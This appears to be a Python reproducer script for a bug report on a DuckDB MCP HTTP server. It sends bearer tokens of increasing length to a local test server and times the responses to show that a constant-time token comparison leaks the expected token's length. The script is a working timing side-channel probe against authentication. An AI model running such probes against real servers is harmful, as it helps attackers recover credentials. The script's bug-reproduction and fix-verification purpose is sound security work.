#!/usr/bin/env python3
"""Reproducer for issue #39: ConstantTimeEquals leaks token length via timing.

Demonstrates that the `max(a.size(), b.size())`-based comparison loop allows
an attacker to infer the expected token length by sending tokens of increasing
size and observing the transition point where timing shifts from constant
(dominated by the expected token length) to proportional (dominated by the
attacker-supplied length).

Usage:
    1. Start a DuckDB MCP HTTP server with auth enabled:
       SELECT mcp_server_start('http', 'localhost', 18099,
              '{"auth_token":"secret123"}');
    2. Run this script:
       python3 reproduce_timing_leak.py [host] [port]

The script prints per-length median response times. With the vulnerable
implementation you should see timing stay roughly flat until the attacker
length exceeds `len("Bearer " + token)`, then begin increasing linearly.
With a fixed implementation, timing should stay constant regardless of
attacker input length.
"""

import statistics
import sys
import time
import urllib.request
import urllib.error

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 18099
URL = f"http://{HOST}:{PORT}/mcp"
ROUNDS = 80  # requests per token length
BODY = b'{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}'

# "Bearer secret123" is 16 characters.  Probe lengths 1..40 to find the knee.
PROBE_LENGTHS = range(1, 41)


def timed_request(token_value: str) -> float:
    """Send one auth request and return elapsed time in microseconds."""
    req = urllib.request.Request(
        URL,
        data=BODY,
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token_value}",
        },
        method="POST",
    )
    start = time.perf_counter_ns()
    try:
        urllib.request.urlopen(req, timeout=5)
    except urllib.error.HTTPError:
        pass  # 401/403 expected
    elapsed_ns = time.perf_counter_ns() - start
    return elapsed_ns / 1000.0  # microseconds


def main() -> None:
    print(f"Target: {URL}")
    print(f"Rounds per length: {ROUNDS}")
    print()
    print(f"{'Length':>6}  {'Median µs':>10}  {'StdDev µs':>10}  Bar")
    print("-" * 60)

    results: list[tuple[int, float]] = []

    for length in PROBE_LENGTHS:
        token = "x" * length
        times = [timed_request(token) for _ in range(ROUNDS)]
        med = statistics.median(times)
        sd = statistics.stdev(times) if len(times) > 1 else 0.0
        results.append((length, med))
        bar = "#" * max(1, int(med / 50))
        print(f"{length:>6}  {med:>10.1f}  {sd:>10.1f}  {bar}")

    # Simple analysis: compare median for short vs long tokens
    short_times = [med for ln, med in results if ln <= 8]
    long_times = [med for ln, med in results if ln >= 25]
    if short_times and long_times:
        short_avg = statistics.mean(short_times)
        long_avg = statistics.mean(long_times)
        ratio = long_avg / short_avg if short_avg > 0 else float("inf")
        print()
        print(f"Short tokens (<=8) avg:  {short_avg:.1f} µs")
        print(f"Long tokens  (>=25) avg: {long_avg:.1f} µs")
        print(f"Ratio (long/short):      {ratio:.2f}x")
        if ratio > 1.15:
            print("=> VULNERABLE: timing increases with attacker-supplied length")
        else:
            print("=> OK: timing appears constant regardless of input length")


if __name__ == "__main__":
    main()
